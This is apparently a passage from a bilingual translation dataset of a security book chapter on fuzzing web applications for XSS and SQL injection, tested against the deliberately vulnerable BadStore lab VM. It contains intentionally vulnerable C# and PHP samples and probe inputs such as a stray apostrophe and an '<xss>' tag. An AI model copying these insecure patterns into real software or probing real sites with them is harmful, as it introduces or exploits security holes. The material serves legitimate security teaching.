- en: '2'
  id: totrans-0
  prefs: []
  type: TYPE_NORMAL
  zh: '2'
- en: FUZZING AND EXPLOITING XSS AND SQL INJECTION
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 模糊测试与利用 XSS 和 SQL 注入
- en: '![](images/00010.jpg)'
  id: totrans-2
  prefs: []
  type: TYPE_IMG
  zh: '![](images/00010.jpg)'
- en: In this chapter, you’ll learn how to write a short and sweet cross-site scripting
    (XSS) and SQL injection fuzzer for URLs that take HTTP parameters in GET and POST
    requests. A fuzzer is software that attempts to find errors in other software,
    such as that on servers, by sending bad or malformed data. The two general types
    of fuzzers are mutational and generational. A mutational fuzzer attempts to taint
    the data in a known-good input with bad data, without regard for the protocol
    or the structure of the data. In contrast, a generational fuzzer takes into account
    the nuances of the server’s communication protocol and uses these nuances to generate
    technically valid data that is sent to the server. With both types of fuzzers,
    the goal is to get the server to return an error to the fuzzer.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，您将学会如何编写一个简短有效的跨站脚本（XSS）和 SQL 注入模糊测试工具，用于处理带有 GET 和 POST 请求 HTTP 参数的 URL。模糊测试工具是一种尝试通过发送错误或格式不正确的数据来找出其他软件（例如服务器软件）中的漏洞的工具。模糊测试工具一般分为两种类型：突变模糊测试工具和生成型模糊测试工具。突变模糊测试工具尝试在已知的良好输入中注入坏数据，不考虑协议或数据的结构。相比之下，生成型模糊测试工具会考虑服务器通信协议的细节，并利用这些细节生成技术上有效的数据并发送到服务器。对于这两种类型的模糊测试工具，目标是让服务器返回错误，从而让模糊测试工具发现漏洞。
- en: We’ll write a mutational fuzzer that you can use when you have a known-good
    input in the form of a URL or HTTP request. (We’ll write a generational fuzzer
    in [Chapter 3](index_split_008.html#filepos243384).) Once you’re able to use a
    fuzzer to find XSS and SQL injection vulnerabilities, you’ll learn how to exploit
    the SQL injection vulnerabilities to retrieve usernames and password hashes from
    the database.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将编写一个突变模糊测试工具，您可以在已知良好输入（如 URL 或 HTTP 请求）时使用。（我们将在[第 3 章](index_split_008.html#filepos243384)中编写一个生成型模糊测试工具。）一旦您能够使用模糊测试工具发现
    XSS 和 SQL 注入漏洞，您将学会如何利用 SQL 注入漏洞从数据库中提取用户名和密码哈希。
- en: In order to find and exploit XSS and SQL injection vulnerabilities, we’ll use
    the core HTTP libraries to build HTTP requests programmatically in C#. We’ll first
    write a simple fuzzer that parses a URL and begins fuzzing the HTTP parameters
    using GET and POST requests. Next, we’ll develop full exploits for the SQL injection
    vulnerabilities that use carefully crafted HTTP requests to extract user information
    from the database.
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 为了发现和利用 XSS 和 SQL 注入漏洞，我们将使用核心 HTTP 库在 C# 中编程构建 HTTP 请求。我们将首先编写一个简单的模糊测试工具，它解析
    URL 并开始使用 GET 和 POST 请求模糊测试 HTTP 参数。接下来，我们将开发针对 SQL 注入漏洞的完整利用工具，这些工具使用精心构造的 HTTP
    请求从数据库中提取用户信息。
- en: We’ll test our tools in this chapter against a small Linux distribution called
    BadStore (available at the VulnHub website, [https://www.vulnhub.com/](https://www.vulnhub.com/)).
    BadStore is designed with vulnerabilities like SQL injections and XSS attacks
    (among many others). After downloading the BadStore ISO from VulnHub, we’ll use
    the free VirtualBox virtualization software to create a virtual machine in which
    to boot the BadStore ISO so that we can attack without risk of compromising our
    own host system.
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将针对一个名为 BadStore 的小型 Linux 发行版测试我们的工具（可以在 VulnHub 网站上找到，[https://www.vulnhub.com/](https://www.vulnhub.com/)）。BadStore
    设计中包含了像 SQL 注入和 XSS 攻击等漏洞（还有许多其他漏洞）。从 VulnHub 下载 BadStore 的 ISO 文件后，我们将使用免费的 VirtualBox
    虚拟化软件创建一个虚拟机，在其中启动 BadStore ISO，以便我们能够进行攻击，而不必担心危及主机系统的安全。
- en: Setting Up the Virtual Machine
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: 设置虚拟机
- en: To install VirtualBox on Linux, Windows, or OS X, download the VirtualBox software
    from [https://www.virtualbox.org/](https://www.virtualbox.org/). (Installation
    should be simple; just follow the latest directions on the site when you download
    the software.) Virtual machines (VMs) allow us to emulate a computer system using
    a physical computer. We can use virtual machines to easily create and manage vulnerable
    software systems (such as the ones we will use throughout the book).
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 要在 Linux、Windows 或 OS X 上安装 VirtualBox，请从 [https://www.virtualbox.org/](https://www.virtualbox.org/)
    下载 VirtualBox 软件。（安装过程应该很简单；只需按照网站上最新的指示操作即可。）虚拟机（VM）允许我们使用物理计算机模拟计算机系统。我们可以使用虚拟机轻松创建和管理易受攻击的软件系统（例如我们将在本书中使用的那些系统）。
- en: Adding a Host-Only Virtual Network
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 添加仅主机虚拟网络
- en: 'You may need to create a host-only virtual network for the VM before actually
    setting it up. A host-only network allows communication only between VMs and the
    host system. Here are the steps to follow:'
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 在实际设置虚拟机之前，您可能需要为虚拟机创建一个仅主机虚拟网络。仅主机网络允许虚拟机和主机系统之间的通信。以下是需要遵循的步骤：
- en: Click File ▸ Preferences to open the VirtualBox – Preferences dialog. On OS
    X, select the VirtualBox ▸ Preferences.
  id: totrans-11
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击“文件” ▸ “偏好设置”打开 VirtualBox – 偏好设置对话框。在 OS X 上，选择 VirtualBox ▸ “偏好设置”。
- en: 'Click the Network section on the left. You should see two tabs: NAT Networks
    and Host-only Networks. On OS X, click the Network tab at the top of the Settings
    dialog.'
  id: totrans-12
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击左侧的“网络”部分。你应该会看到两个选项卡：NAT 网络和仅主机网络。在 OS X 上，点击设置对话框顶部的“网络”选项卡。
- en: Click the Host-only Networks tab and then the Add host-only network (Ins) button
    on the right. This button is an icon of a network card overlaid with a plus sign.
    This should create a network named vboxnet0.
  id: totrans-13
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击“仅主机网络”选项卡，然后点击右侧的“添加仅主机网络（Ins）”按钮。这个按钮是一个叠加着加号的网卡图标。此时应该会创建一个名为 vboxnet0
    的网络。
- en: Click the Edit host-only network (Space) button on the right. This button is
    an icon of a screwdriver.
  id: totrans-14
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击右侧的“编辑仅主机网络（空格）”按钮。这个按钮是一个螺丝刀的图标。
- en: From the dialog that opens, click the DHCP Server tab. Check the Enable Server
    box. In the Server Address field, enter the IP address 192.168.56.2. In the Server
    Mask field, enter 255.255.255.0. In the Lower Address Bound field, enter 192.168.56.100.
    In the Upper Address Bound field, enter 192.168.56.199.
  id: totrans-15
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 从弹出的对话框中，点击 DHCP 服务器选项卡。勾选“启用服务器”框。在服务器地址字段中，输入 IP 地址 192.168.56.2。在服务器掩码字段中，输入
    255.255.255.0。在下限地址字段中，输入 192.168.56.100。在上限地址字段中，输入 192.168.56.199。
- en: Click OK to save changes to the host-only network.
  id: totrans-16
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击“确定”以保存对仅主机网络的更改。
- en: Click OK again to close the Settings dialog.
  id: totrans-17
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 再次点击“确定”以关闭设置对话框。
- en: Creating the Virtual Machine
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 创建虚拟机
- en: 'Once VirtualBox is installed and configured with a host-only network, here’s
    how to set up the VM:'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 安装并配置好 VirtualBox 并设置了仅主机网络后，按照以下步骤设置虚拟机：
- en: Click the New icon in the top-left corner, as shown in [Figure 2-1](#filepos121544).
  id: totrans-20
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击左上角的新建图标，如[图 2-1](#filepos121544)所示。
- en: When presented with a dialog to choose the name of the operating system and
    type, select the Other Linux (32-bit) drop-down option.
  id: totrans-21
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当弹出一个对话框询问选择操作系统名称和类型时，选择“其他 Linux（32 位）”下拉选项。
- en: Click Continue, and you should be presented with a screen to give the virtual
    machine some RAM. Set the amount of RAM to 512 MB and click Continue. (Fuzzing
    and exploiting can make the web server use a lot of RAM on the virtual machine.)
  id: totrans-22
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击“继续”，你应该会看到一个屏幕，用于为虚拟机分配一些 RAM。将 RAM 设置为 512 MB，然后点击“继续”。（模糊测试和利用漏洞可能会让虚拟机上的
    Web 服务器使用大量 RAM。）
- en: When asked to create a new virtual hard drive, choose Do not add a virtual hard
    drive and click Create. (We’ll run BadStore from the ISO image.) You should now
    see the VM in the left pane of the VirtualBox Manager window, as shown in [Figure
    2-1](#filepos121544).
  id: totrans-23
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当被要求创建一个新的虚拟硬盘时，选择“不添加虚拟硬盘”，然后点击“创建”。（我们将从 ISO 镜像运行 BadStore。）你现在应该会在 VirtualBox
    管理器窗口的左侧窗格中看到虚拟机，如[图 2-1](#filepos121544)所示。
- en: '![](images/00014.jpg)'
  id: totrans-24
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](images/00014.jpg)'
- en: 'Figure 2-1: VirtualBox with a BadStore VM'
  id: totrans-25
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 2-1：带有 BadStore 虚拟机的 VirtualBox
- en: Booting the Virtual Machine from the BadStore ISO
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 从 BadStore ISO 启动虚拟机
- en: 'Once the VM has been created, set it to boot from the BadStore ISO by following
    these steps:'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦虚拟机创建完成，按照以下步骤设置它从 BadStore ISO 启动：
- en: Right-click the VM in the left pane of the VirtualBox Manager and click Settings.
    A dialog should appear showing the current settings for the network card, CD-ROM,
    and other miscellaneous configuration items.
  id: totrans-28
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 VirtualBox 管理器的左侧窗格中右键点击虚拟机，点击“设置”。此时应弹出一个对话框，显示网络卡、光驱及其他杂项配置项的当前设置。
- en: Select the Network tab in the Settings dialog. You should see upwards of seven
    settings for the network card, including NAT (network address translation), host-only,
    and bridged. Choose host-only networking to allocate an IP address that is accessible
    only from the host machine but not from the rest of the Internet.
  id: totrans-29
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在设置对话框中选择“网络”选项卡。你应该会看到至少七个与网络卡相关的设置，包括 NAT（网络地址转换）、仅主机和桥接。选择仅主机网络，以分配一个仅主机机器可访问而无法从其他互联网设备访问的
    IP 地址。
- en: You need to set the type of network card in the Advanced drop-down to an older
    chipset, because BadStore is based on an old Linux kernel and some newer chipsets
    aren’t supported. Choose PCnet-FAST III.
  id: totrans-30
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 你需要在“高级”下拉菜单中将网络卡类型设置为较旧的芯片组，因为 BadStore 基于较旧的 Linux 内核，某些较新的芯片组不被支持。选择 PCnet-FAST
    III。
- en: 'Now set the CD-ROM to boot from the ISO on the hard drive by following these
    steps:'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，按照以下步骤设置光驱从硬盘上的 ISO 启动：
- en: Select the Storage tab in the Settings dialog. Click the CD icon to show a menu
    with the option Choose a virtual CD/DVD disk file.
  id: totrans-32
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在设置对话框中选择“存储”选项卡。点击 CD 图标，弹出一个菜单，其中包含“选择虚拟 CD/DVD 磁盘文件”选项。
- en: Click the Choose a virtual CD/DVD disk file option to find the BadStore ISO
    that you saved to your filesystem and set it as the bootable media. The virtual
    machine should now be ready to boot.
  id: totrans-33
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击“选择虚拟 CD/DVD 磁盘文件”选项，找到您保存在文件系统中的 BadStore ISO 并将其设置为可启动介质。虚拟机现在应该准备好启动。
- en: Save the settings by clicking OK in the bottom-right corner of the Settings
    tab. Then click the Start button in the top-left corner of the VirtualBox Manager,
    next to the Settings gear button, to boot the virtual machine.
  id: totrans-34
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过点击设置选项卡右下角的 OK 按钮保存设置。然后点击 VirtualBox Manager 左上角的启动按钮，旁边是设置齿轮按钮，以启动虚拟机。
- en: Once the machine has booted, you should see a message saying, “Please press
    Enter to activate this console.” Press enter and type ifconfig to view the IP
    configuration that should have been acquired.
  id: totrans-35
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦机器启动，您应该看到一条消息，提示“请按 Enter 键激活此控制台。”按下回车键并输入 ifconfig 查看应该已获取的 IP 配置。
- en: Once you have your virtual machine’s IP address, enter it in your web browser,
    and you should see a screen like the one shown in [Figure 2-2](#filepos124776).
  id: totrans-36
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦您获得虚拟机的 IP 地址，输入该地址到您的网页浏览器中，您应该看到一个类似于 [图 2-2](#filepos124776) 所示的屏幕。
- en: '![](images/00023.jpg)'
  id: totrans-37
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](images/00023.jpg)'
- en: 'Figure 2-2: The main page of the BadStore web application'
  id: totrans-38
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 2-2：BadStore Web 应用程序的主页
- en: SQL Injections
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: SQL 注入
- en: In today’s rich web applications, programmers need to be able to store and query
    information behind the scenes in order to provide high-quality, robust user experiences.
    This is generally accomplished using a Structured Query Language (SQL; pronounced
    sequel) database such as MySQL, PostgreSQL, or Microsoft SQL Server.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 在今天丰富的 Web 应用程序中，程序员需要能够在后台存储和查询信息，以提供高质量、健壮的用户体验。这通常通过使用结构化查询语言（SQL；发音为 sequel）数据库，如
    MySQL、PostgreSQL 或 Microsoft SQL Server 来完成。
- en: SQL allows a programmer to interact with a database programmatically using SQL
    statements—code that tells the database how to create, read, update, or delete
    data based on some supplied information or criteria. For instance, a SELECT statement
    asking the database for the number of users in a hosted database might look like
    [Listing 2-1](#filepos125800).
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: SQL 允许程序员通过 SQL 语句与数据库进行交互——这些代码指示数据库如何根据提供的信息或标准来创建、读取、更新或删除数据。例如，要求数据库返回托管数据库中的用户数量的
    SELECT 语句可能如下所示 [Listing 2-1](#filepos125800)。
- en: SELECT COUNT(*) FROM USERS
  id: totrans-42
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: SELECT COUNT(*) FROM USERS
- en: 'Listing 2-1: Sample SQL  SELECT  statement'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: Listing 2-1：示例 SQL SELECT 语句
- en: Sometimes programmers need SQL statements to be dynamic (that is, to change
    based on a user’s interaction with a web application). For example, a programmer
    may need to select information from a database based on a certain user’s ID or
    username.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 有时程序员需要 SQL 语句是动态的（也就是说，根据用户与 Web 应用程序的交互而变化）。例如，程序员可能需要根据某个用户的 ID 或用户名从数据库中选择信息。
- en: However, when a programmer builds a SQL statement using data or values supplied
    by a user from an untrusted client such as a web browser, a SQL injection vulnerability
    may be introduced if the values used to build and execute SQL statements are not
    properly sanitized. For example, the C# SOAP method shown in [Listing 2-2](#filepos127474)
    might be used to insert a user into a database hosted on a web server. (SOAP,
    or Simple Object Access Protocol, is a web technology powered by XML that’s used
    to create APIs on web applications quickly. It’s popular in enterprise languages
    such as C# and Java.) [WebMethod]
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，当程序员使用来自不受信任客户端（如网页浏览器）提供的数据或值来构建 SQL 语句时，如果用于构建和执行 SQL 语句的值没有被正确清理，就可能引入
    SQL 注入漏洞。例如， [Listing 2-2](#filepos127474) 中显示的 C# SOAP 方法可能被用来将用户插入到托管在 Web 服务器上的数据库中。（SOAP，或简单对象访问协议，是一种由
    XML 支持的 Web 技术，用于快速创建 Web 应用程序的 API。它在 C# 和 Java 等企业语言中非常流行。）[WebMethod]
- en: public string AddUser(string username, string password)
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: public string AddUser(string username, string password)
- en: '{'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: '{'
- en: NpgsqlConnection conn = new NpgsqlConnection(_connstr);
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: NpgsqlConnection conn = new NpgsqlConnection(_connstr);
- en: conn.Open();
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: conn.Open();
- en: string sql = "insert into users values('{0}', '{1}');";
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: string sql = "insert into users values('{0}', '{1}');";
- en: ➊sql = String.Format(sql, username, password);
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: ➊sql = String.Format(sql, username, password);
- en: NpgsqlCommand command = new NpgsqlCommand(sql, conn);
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: NpgsqlCommand command = new NpgsqlCommand(sql, conn);
- en: ➋command.ExecuteNonQuery();
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: ➋command.ExecuteNonQuery();
- en: conn.Close();
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: conn.Close();
- en: return "Excellent!";
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: return "Excellent!";
- en: '}'
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 2-2: A C# SOAP method vulnerable to a SQL injection'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: Listing 2-2：一个易受 SQL 注入攻击的 C# SOAP 方法
- en: In this case, the programmer hasn’t sanitized the username and password before
    creating ➊ and executing ➋ a SQL string. As a result, an attacker could craft
    a username or password string to make the database run carefully crafted SQL code
    designed to give them remote command execution and full control of the database.
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，程序员在创建 ➊ 和执行 ➋ SQL 字符串之前并未清理用户名和密码。因此，攻击者可以构造一个用户名或密码字符串，迫使数据库执行精心设计的
    SQL 代码，目的是让他们远程执行命令并完全控制数据库。
- en: If you were to pass in an apostrophe with one of the parameters (say user'name
    instead of username), the ExecuteNonQuery() method would try to run an invalid
    SQL query (shown in [Listing 2-3](#filepos128544)). Then the method would throw
    an exception, which would be shown in the HTTP response for the attacker to see.
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你在某个参数中传递一个单引号（比如将 user'name 而不是 username 传递给参数），ExecuteNonQuery() 方法会尝试执行一个无效的
    SQL 查询（如[示例 2-3](#filepos128544)所示）。接着，方法会抛出一个异常，该异常将在 HTTP 响应中显示，攻击者可以看到。
- en: 'insert into users values(''user''name'', ''password''); Listing 2-3: This SQL
    query is invalid due to unsanitized user-supplied data.'
  id: totrans-60
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: insert into users values('user'name', 'password'); 示例 2-3：由于未清理的用户提供数据，此 SQL
    查询无效。
- en: Many software libraries that enable database access allow a programmer to safely
    use values supplied by an untrusted client like a web browser with parameterized
    queries. These libraries automatically sanitize any untrusted values passed to
    a SQL query by escaping characters such as apostrophes, parentheses, and other
    special characters used in the SQL syntax. Parameterized queries and other types
    of Object Relational Mapping (ORM) libraries like NHibernate help to prevent these
    SQL injection issues.
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 许多支持数据库访问的软件库通过参数化查询，允许程序员安全地使用由不信任的客户端（如网页浏览器）提供的值。这些库会自动清理传递给 SQL 查询的任何不信任的值，通过转义如撇号、括号以及
    SQL 语法中使用的其他特殊字符来防止潜在的安全风险。参数化查询和其他类型的对象关系映射（ORM）库（如 NHibernate）有助于防止这些 SQL 注入问题。
- en: User-supplied values like these tend to be used in WHERE clauses within SQL
    queries, as in [Listing 2-4](#filepos129553).
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 像这样的用户提供值通常会在 SQL 查询的 WHERE 子句中使用，如[示例 2-4](#filepos129553)所示。
- en: SELECT * FROM users WHERE user_id = '1'
  id: totrans-63
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: SELECT * FROM users WHERE user_id = '1'
- en: 'Listing 2-4: Sample SQL  SELECT  statement selecting a row for a specific  user_id'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 2-4：选择特定 user_id 的 SQL SELECT 语句
- en: As shown in [Listing 2-3](#filepos128544), throwing a single apostrophe into
    an HTTP parameter that is not properly sanitized before being used to build a
    dynamic SQL query could cause an error to be thrown by the web application (such
    as an HTTP return code of 500) because an apostrophe in SQL denotes the beginning
    or end of a string. The single apostrophe invalidates the statement by ending
    a string prematurely or by beginning a string without ending it. By parsing the
    HTTP response to such a request, we can fuzz these web applications and search
    for user-supplied HTTP parameters that lead to SQL errors in the response when
    the parameters are tampered with.
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 如[示例 2-3](#filepos128544)所示，在没有正确清理的情况下，将一个单引号放入 HTTP 参数中，且该参数被用来构建动态 SQL 查询，可能会导致网页应用程序抛出错误（例如
    HTTP 返回码 500）。这是因为在 SQL 中，单引号表示字符串的开始或结束。单引号会通过提前结束字符串或在未结束字符串的情况下开始字符串，从而使语句无效。通过解析对该请求的
    HTTP 响应，我们可以模糊测试这些网页应用程序，并搜索那些在篡改参数后，导致 SQL 错误的用户提供的 HTTP 参数。
- en: Cross-Site Scripting
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 跨站脚本攻击
- en: Like SQL injection, cross-site scripting (XSS) attacks exploit vulnerabilities
    in code that crop up when programmers build HTML to be rendered in the web browser
    using data passed from the web browser to the server. Sometimes, the data supplied
    by an untrusted client, such as a web browser, to the server can contain HTML
    code such as JavaScript, allowing an attacker to potentially take over a website
    by stealing cookies or redirecting users to a malicious website with raw, unsanitized
    HTML.
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 与 SQL 注入类似，跨站脚本攻击（XSS）利用了代码中的漏洞，这些漏洞通常在程序员构建用于在网页浏览器中渲染的 HTML 时出现，数据是从网页浏览器传递到服务器的。有时候，来自不信任客户端（如网页浏览器）的数据可能包含
    HTML 代码，如 JavaScript，从而允许攻击者通过窃取 cookies 或将用户重定向到恶意网站，可能会接管网站并执行未经清理的原始 HTML。
- en: For example, a blog that allows for comments might send an HTTP request with
    the data in a comment form to a site’s server. If an attacker were to create a
    malicious comment with embedded HTML or JavaScript, and the blog software trusted
    and therefore did not sanitize the data from the web browser submitting the “comment,”
    the attacker could use their loaded attack comment to deface the website with
    their own HTML code or redirect any of the blog’s visitors to the attacker’s own
    website. The attacker could then potentially install malware on the visitors’
    machines.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，一个允许评论的博客可能会发送包含评论表单数据的HTTP请求到网站的服务器。如果攻击者创建一个嵌入了HTML或JavaScript的恶意评论，并且博客软件信任并因此没有清理来自提交“评论”的网页浏览器的数据，攻击者就可以利用他们加载的攻击性评论用自己的HTML代码毁坏网站，或将博客的访客重定向到攻击者自己的网站。攻击者还可能在访客的计算机上安装恶意软件。
- en: Generally speaking, a quick way to detect code in a website that may be vulnerable
    to XSS attacks is to make a request to the site with a tainted parameter. If the
    tainted data appears in the response without alteration, you may have found a
    vector for XSS. For instance, suppose you pass <xss> in a parameter within an
    HTTP request, as in [Listing 2-5](#filepos132882).
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 一般来说，检测网站是否可能易受XSS攻击的一种快速方法是向该站点发送一个带有污染参数的请求。如果污染的数据在响应中未被修改，你可能找到了一个XSS攻击的向量。例如，假设你在HTTP请求中传递了<xss>作为参数，如[列表2-5](#filepos132882)所示。
- en: GET /index.php?name=Brandon<xss> HTTP/1.1
  id: totrans-70
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: GET /index.php?name=Brandon<xss> HTTP/1.1
- en: 'Host: 10.37.129.5'
  id: totrans-71
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Host: 10.37.129.5'
- en: 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101
    Firefox/37.0'
  id: totrans-72
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101
    Firefox/37.0'
- en: 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
  id: totrans-73
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
- en: 'Accept-Language: en-US,en;q=0.5'
  id: totrans-74
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Accept-Language: en-US,en;q=0.5'
- en: 'Accept-Encoding: gzip, deflate'
  id: totrans-75
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Accept-Encoding: gzip, deflate'
- en: 'Connection: keep-alive Listing 2-5: Sample GET request to a PHP script with
    a query string parameter'
  id: totrans-76
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Connection: keep-alive 列表2-5：带查询字符串参数的PHP脚本的示例GET请求'
- en: The server responds with something like the HTTP response in [Listing 2-6](#filepos133737).
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器响应类似于[列表2-6](#filepos133737)中的HTTP响应。
- en: HTTP/1.1 200 OK
  id: totrans-78
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: HTTP/1.1 200 OK
- en: 'Date: Sun, 19 Apr 2015 21:28:02 GMT'
  id: totrans-79
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Date: Sun, 19 Apr 2015 21:28:02 GMT'
- en: 'Server: Apache/2.4.7 (Ubuntu)'
  id: totrans-80
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Server: Apache/2.4.7 (Ubuntu)'
- en: 'X-Powered-By: PHP/5.5.9-1ubuntu4.7'
  id: totrans-81
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'X-Powered-By: PHP/5.5.9-1ubuntu4.7'
- en: 'Content-Length: 32'
  id: totrans-82
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Content-Length: 32'
- en: 'Keep-Alive: timeout=5, max=100'
  id: totrans-83
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Keep-Alive: timeout=5, max=100'
- en: 'Connection: Keep-Alive'
  id: totrans-84
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Connection: Keep-Alive'
- en: 'Content-Type: text/html'
  id: totrans-85
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'Content-Type: text/html'
- en: ''
  id: totrans-86
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: 'Welcome Brandon&lt;xss&gt;<br /> Listing 2-6: Sample response from the PHP
    script sanitizing the  name  query string parameter'
  id: totrans-87
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Welcome Brandon&lt;xss&gt;<br /> 列表2-6：PHP脚本清理name查询字符串参数的示例响应
- en: Essentially, if the code <xss> is replaced with a version that has some HTML
    entities, you know that the site is filtering input using a PHP function such
    as htmlspecialchars() or a similar method. However, if the site simply returns
    <xss> in the response, you know that it’s not performing any filtering or sanitization,
    as with the HTTP name parameter in the code shown in [Listing 2-7](#filepos134778).
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 本质上，如果代码中的<xss>被替换为包含一些HTML实体的版本，你就知道该网站正在使用PHP函数（如htmlspecialchars()）或类似方法过滤输入。然而，如果网站在响应中直接返回<xss>，你就知道它没有进行任何过滤或清理，就像在[列表2-7](#filepos134778)中显示的HTTP名称参数一样。
- en: <?php
  id: totrans-89
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: <?php
- en: $name = $_GET['name'];
  id: totrans-90
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $name = $_GET['name'];
- en: ➊echo "Welcome $name<br>";
  id: totrans-91
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➊echo "Welcome $name<br>";
- en: '?> Listing 2-7: PHP code vulnerable to XSS'
  id: totrans-92
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ?> 列表2-7：易受XSS攻击的PHP代码
- en: As with the code vulnerable to a SQL injection in [Listing 2-1](#filepos125800),
    the programmer is not sanitizing or replacing any potentially bad characters in
    the parameter before rendering the HTML to the screen ➊. By passing a specially
    crafted name parameter to the web application, we can render HTML to the screen,
    execute JavaScript, and even run Java applets that attempt to take over the computer.
    For example, we could send a specially crafted URL such as the one in [Listing
    2-8](#filepos135609).
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
